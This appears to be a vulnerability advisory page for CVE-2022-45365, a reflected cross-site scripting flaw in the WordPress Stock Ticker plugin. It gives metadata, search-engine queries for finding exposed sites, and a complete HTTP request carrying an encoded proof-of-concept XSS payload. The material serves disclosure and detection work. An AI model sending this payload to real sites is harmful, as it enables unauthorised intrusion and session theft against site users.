---
layout: post
cve_id: CVE-2022-45365
title: Stock Ticker <= 3.23.2 - Cross-Site-Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-45365.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-45365.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: medium
impact: 'Unauthenticated attackers can inject malicious JavaScript through the endpoint
  parameter in the ajax_stockticker_symbol_search_test function to steal WordPress
  user session cookies and credentials.

  '
remediation: Fixed in version 3.23.3
reference:
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/stock-ticker/stock-ticker-3232-reflected-cross-site-scripting-in-ajax-stockticker-symbol-search-test
- https://patchstack.com/database/vulnerability/stock-ticker/wordpress-stock-ticker-plugin-3-23-2-reflected-cross-site-scripting-xss-vulnerability
- https://wordpress.org/plugins/stock-ticker/
- https://nvd.nist.gov/vuln/detail/CVE-2022-45365
- https://patchstack.com/database/vulnerability/stock-ticker/wordpress-stock-ticker-plugin-3-23-2-reflected-cross-site-scripting-xss-vulnerability?_s_id=cve
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2022-45365
  cwe-id: CWE-79
  epss-score: 0.1672
  epss-percentile: 0.94721
  cpe: cpe:2.3:a:urosevic:stock_ticker:*:*:*:*:*:wordpress:*:*
metadata:
  verified: 'true'
  max-request: 1
  vendor: urosevic
  product: stock_ticker
  framework: wordpress
  shodan-query: http.html:/wp-content/plugins/stock-ticker/
  fofa-query: body=/wp-content/plugins/stock-ticker/
  publicwww-query: /wp-content/plugins/stock-ticker/
tags:
- cve2022
- cve
- wordpress
- wp-plugin
- wpscan
- wp
- stock-ticker
- unauth
- xss
- urosevic
- vuln
---

## ðŸ” Vulnerability Description
The Stock Ticker plugin for WordPress is vulnerable to Reflected Cross-Site Scripting in the ajax_stockticker_symbol_search_test function in versions up to, and including, 3.23.2 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15
Connection: close
Content-Length: 168
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
action=stockticker_symbol_search_test&symbol=test&endpoint=%3Cimg+src%3Dx+onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%28document.domain%29%3E
```

